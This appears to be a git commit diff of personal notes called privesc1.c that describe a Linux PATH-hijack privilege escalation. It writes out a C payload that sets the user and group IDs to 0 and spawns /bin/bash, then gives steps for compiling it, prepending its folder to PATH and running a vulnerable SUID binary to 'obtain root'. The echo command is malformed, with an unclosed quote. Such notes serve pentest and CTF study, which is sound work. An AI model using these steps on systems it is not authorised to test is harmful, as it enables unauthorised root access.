e95eeb9560b21ddeba761c2d137761ec81950809
Xarmen <16585114+XarmenXepo@users.noreply.github.com>
2024-08-19 21:39:34 -0400

    Update privesc1.c

--- privesc1.c
+++ privesc1.c
@@ -1,14 +1,14 @@
 // this is contingent on a vulnerable binary in Linux with the Owner Permission SUID set to 'rws' 
 // this allows for execution of said vulnerable binary as root
-// create a simple C file for linux priv esc that opens binbash
+// create a simple C file for linux priv esc that will execute when $PATH of vulnerabl env variable is called
 
 
 
-echo 'int main () { setgid(0); setuid(0); system("/bin/bash"); return 0;} > /some_folder/some_file.c
+echo 'int main () { setgid(0); setuid(0); system("/bin/bash"); return 0;} > /dir_where_$PATH_goes_to_execute_vulnerable_bin/name_of_file.c
 
 
 
-// compile file: gcc /some_folder/some_file.c
-// change the env variable of PATH to the folder of our malicious file /some_folder: export PATH=/tmp:$PATH
-// run the path of the vulnerable binary: /usr/local/bin/vulnerable_bin
+// compile file: gcc /dir_where_$PATH_goes_to_execute_vulnerable_bin/name_of_file.c
+// update the env variable of $PATH to the folder of our malicious file: export PATH=/dir_where_$PATH_goes_to_execute_vulnerable_bin:$PATH
+// run the file path of the vulnerable binary on the CLI: /usr/local/bin/vulnerable_bin
 // obtain root
